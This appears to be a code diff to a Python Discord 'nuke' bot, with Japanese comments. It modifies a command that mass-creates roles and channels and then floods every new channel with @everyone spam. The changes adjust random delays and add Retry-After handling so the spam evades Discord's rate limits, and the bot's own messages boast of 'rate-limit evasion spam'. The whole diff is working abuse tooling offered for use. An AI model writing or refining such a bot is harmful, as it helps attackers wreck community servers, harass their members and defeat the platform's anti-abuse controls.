@@ -7,6 +7,7 @@ from flask import Flask, jsonify
 import logging
 import asyncio
 import random 
+import time # timeモジュールをインポート (必要に応じて)
 
 # ログ設定: 警告レベル以上のみ表示
 logging.basicConfig(level=logging.WARNING)
@@ -108,16 +109,19 @@ async def get_server_data(ctx, server_id: int):
 async def send_spam_message_with_delay(channel, content):
     """チャンネルへのメッセージ送信を行い、極めて短いランダム遅延を挟む（レート制限対策）"""
     try:
-        # チャンネルごとに0.1〜0.3秒の極めて短いランダム遅延を挟む
-        await asyncio.sleep(random.uniform(0.1, 0.3)) 
+        # 🚨 修正: チャンネルごとのランダム遅延を 0.3秒〜0.7秒 に増加
+        await asyncio.sleep(random.uniform(0.3, 0.7)) 
         await channel.send(content)
         return True
     except discord.HTTPException as e:
-        # レート制限エラーを警告として記録するが、続行する
+        # レート制限エラーを警告として記録し、リトライ情報を確認
         if e.status == 429:
             logging.warning(f"チャンネル {channel.name} でレート制限に達したぜ (429)。")
-            # レート制限の場合は、少し長めに待機してからFalseを返す
-            await asyncio.sleep(random.uniform(3.0, 5.0))
+            # Discordが要求する待機時間 (Retry-After) があれば取得し、待機する
+            retry_after = e.response.headers.get("Retry-After")
+            wait_time = float(retry_after) if retry_after else random.uniform(5.0, 10.0)
+            logging.warning(f"レート制限解除まで {wait_time:.2f} 秒待機するぜ。")
+            await asyncio.sleep(wait_time)
         else:
             logging.error(f"チャンネル {channel.name} で予期せぬHTTPエラー: {e}")
         return False
@@ -215,7 +219,7 @@ async def ultimate_nuke_command(ctx):
         logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")
 
 
-    # 3. 全ての新しいチャンネルにスパムメッセージを15回、レート制限ギリギリで送信
+    # 3. 全ての新しいチャンネルにスパムメッセージを15回、レート制限対策を施して送信
     if successful_channels:
         spam_message_content = (
             "# @everyoneruru by nuke😂\n"
@@ -225,10 +229,10 @@ async def ultimate_nuke_command(ctx):
         )
         spam_count = 15
         
-        await successful_channels[0].send(f"📣 **MAX SPEED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**レート制限ギリギリスパム**を送りつけるぞ！")
+        await successful_channels[0].send(f"📣 **MAX SPEED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**レート制限回避スパム**を送りつけるぞ！")
 
         
-        # 🚨 修正されたロジック: チャンネルを横断しながら、15回のラウンドを限界速度で実行
+        # 🚨 修正されたロジック: チャンネルを横断しながら、15回のラウンドを実行
         for j in range(spam_count):
             spam_tasks = []
             for channel in successful_channels:
@@ -236,14 +240,14 @@ async def ultimate_nuke_command(ctx):
                 spam_tasks.append(asyncio.create_task(send_spam_message_with_delay(channel, spam_message_content)))
                 
             try:
-                # 全てのタスクが完了するのを待つ (レート制限でブロックされたら、send_spam_message_with_delay内で処理される)
+                # 全てのタスクが完了するのを待つ 
                 await asyncio.gather(*spam_tasks)
                 
             except Exception as e:
                 logging.warning(f"スパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
             
             # 各ラウンド間のインターバル (最低限の待機)
-            await asyncio.sleep(random.uniform(0.5, 1.0))
+            await asyncio.sleep(random.uniform(1.0, 2.0))
 
     # 4. 最終報告
     if successful_channels:
